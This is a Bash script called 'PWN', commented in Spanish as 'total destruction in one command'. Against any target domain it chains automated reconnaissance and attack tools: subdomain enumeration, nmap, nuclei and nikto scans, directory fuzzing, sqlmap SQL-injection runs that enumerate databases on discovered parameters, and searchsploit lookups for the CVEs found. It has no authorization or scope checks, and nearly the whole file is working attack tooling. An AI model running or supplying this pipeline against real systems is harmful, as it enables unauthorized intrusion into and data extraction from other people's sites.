#!/bin/bash
# PWN - DESTRUCCIÓN TOTAL EN UN COMANDO
# Uso: pwn <target>

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

TARGET="$1"
[[ -z "$TARGET" ]] && echo "Uso: pwn <target>" && exit 1

# Extraer dominio
DOMAIN=$(echo "$TARGET" | sed -E 's|https?://||' | cut -d'/' -f1)
URL="https://$DOMAIN"
RESULTS="/home/xroot/Documents/Proyectos_Kali/recon/active/${DOMAIN}_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$RESULTS" && cd "$RESULTS"

echo -e "${RED}[PWN] Target: $TARGET${NC}"
echo -e "${BLUE}[PWN] Output: $RESULTS${NC}"

# FASE 1: RECON
echo -e "\n${GREEN}[1/6] RECONOCIMIENTO${NC}"
subfinder -d "$DOMAIN" -silent > subdomains.txt 2>/dev/null &
nmap -sV -sC -T4 "$DOMAIN" -oN nmap.txt 2>/dev/null &
wait

# FASE 2: HOSTS VIVOS
echo -e "${GREEN}[2/6] HOSTS VIVOS${NC}"
cat subdomains.txt 2>/dev/null | httpx -silent | tee live.txt

# FASE 3: NUCLEI
echo -e "${GREEN}[3/6] VULNERABILITY SCAN${NC}"
nuclei -u "$URL" -severity critical,high -silent -o nuclei.txt 2>/dev/null &
nikto -h "$URL" -o nikto.txt 2>/dev/null &
wait

# FASE 4: FUZZING
echo -e "${GREEN}[4/6] FUZZING${NC}"
ffuf -u "${URL}/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403 -o dirs.json 2>/dev/null

# FASE 5: INJECTION
echo -e "${GREEN}[5/6] INJECTION TESTS${NC}"
paramspider -d "$DOMAIN" -o params.txt 2>/dev/null
[[ -f params.txt ]] && head -10 params.txt | xargs -I{} sqlmap -u "{}" --batch --level=2 --dbs 2>/dev/null | tee sqlmap.txt

# FASE 6: EXPLOITS
echo -e "${GREEN}[6/6] EXPLOIT SEARCH${NC}"
grep -oP 'CVE-\d{4}-\d+' nuclei.txt 2>/dev/null | while read cve; do
    searchsploit "$cve" 2>/dev/null | head -5
done | tee exploits.txt

# REPORTE
echo -e "\n${RED}════════════════════════════════════════${NC}"
echo -e "${RED}[PWN] COMPLETADO - $DOMAIN${NC}"
echo -e "${RED}════════════════════════════════════════${NC}"
echo -e "Subdominios: $(wc -l < subdomains.txt 2>/dev/null || echo 0)"
echo -e "Hosts vivos: $(wc -l < live.txt 2>/dev/null || echo 0)"
echo -e "Vulns nuclei: $(wc -l < nuclei.txt 2>/dev/null || echo 0)"
echo -e "Resultados en: $RESULTS"
